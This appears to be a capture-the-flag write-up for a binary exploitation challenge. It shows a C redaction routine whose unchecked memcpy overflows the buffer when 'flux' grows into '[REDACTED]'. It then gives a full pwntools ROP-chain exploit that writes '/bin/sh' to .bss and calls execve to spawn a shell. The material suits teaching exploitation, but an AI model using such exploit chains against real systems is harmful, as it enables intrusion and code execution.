---
tags: ["pwn"]
date: 31-10-2026
---

# declassifier

### Vuln

- Regex substitution program that replaces "flux" with "[REDACTED]" in user input
  - oob write bug due to length diff btwn words + no bounds check
    - e.g. buffer is size 17 containing `abcdefgflux<payload>` -> `abcdefg[REDACTED]`payload
    - pushes payload out of buffer, causing overflow
```c
static const char *const re = "flux";
static const char *const replace = "[REDACTED]";


static void redact(char buf[], size_t size) {
    const char *s = buf;
    regex_t regex;
    regmatch_t pmatch[1];
    regoff_t off, len;
    size_t remaining = size;

    if (regcomp(&regex, re, REG_NEWLINE))
        die("regcomp");

    for (unsigned int i = 0; ; i++) {
        if (regexec(&regex, s, countof(pmatch), pmatch, 0))
            break;

		printf("%d\n", pmatch[0].rm_so);
		printf("%d\n", pmatch[0].rm_eo);

        off = pmatch[0].rm_so + (s - buf);
        len = pmatch[0].rm_eo - pmatch[0].rm_so;
        remaining = remaining - pmatch[0].rm_so - len;

        // [BUG] overflow by writing a lot of flux
        memcpy(&buf[off+strlen(replace)], &buf[off+len], remaining); // oob write
        memcpy(&buf[off], replace, strlen(replace)); 

        s += pmatch[0].rm_so + strlen(replace); // after [REDACTED]
    }
}

int main(void) {
	...
    char buf[512] = { 0 };
    size_t n = read(STDIN_FILENO, buf, sizeof(buf));
    redact(buf, n);
    printf("%s", buf);
}

```

### Exploit

- no system() or common functions etc -> use syscalls
```python
from pwn import *
import os
path = "./declass"

elf = ELF(path)
context.log_level = "error"
context.binary = elf
libc = elf.libc
context.terminal = ["wt.exe", "-w", "0", "nt", "wsl.exe", "--cd", os.getcwd(), "--"]

p = process(path)
#p=remote('localhost', 1024)
# p = gdb.debug(path, """
# set debuginfod enabled off
# b *(main-1)
# c
# n
# n
# """)

# write /bin/sh into 0x4D9C50 .bss
# we can use gadget `mov qword ptr [r1], r2; ret;``
# find using `grep -E ": mov qword ptr \[.{0,3}\], .{0,3} ; ret``
pop_rcx = 0x0000000000415871
pop_rdi = 0x0000000000465202
pop_rax = 0x000000000043eb83
pop_rsi_rbp = 0x0000000000414d31
execve = 59
syscall = 0x0000000000402790
mov_into_rdi = 0x0000000000472846  # mov qword ptr [rdi], rcx ; ret
bss_addr = 0x4D9C50
bin_sh = int.from_bytes(b"/bin/sh\0", "little")

payload = flat(
    p64(pop_rcx),  # write /bin/sh into 0x4D9C50 .bss
    bin_sh,
    pop_rdi,
    bss_addr,
    mov_into_rdi,  # call execve("/bin/sh", 0)
    pop_rsi_rbp,
    0, 0,
    pop_rax,
    execve,
    syscall
)

payload = b"flux"*50 + b"A"*12 + p64(bss_addr) * 3 + payload

#pwndbg> x/s 0x4d8000 [examine/string <addr>]
#0x4d8000: "/bin/sh"

print(len(payload), payload)
p.sendline(payload)
p.interactive()
```

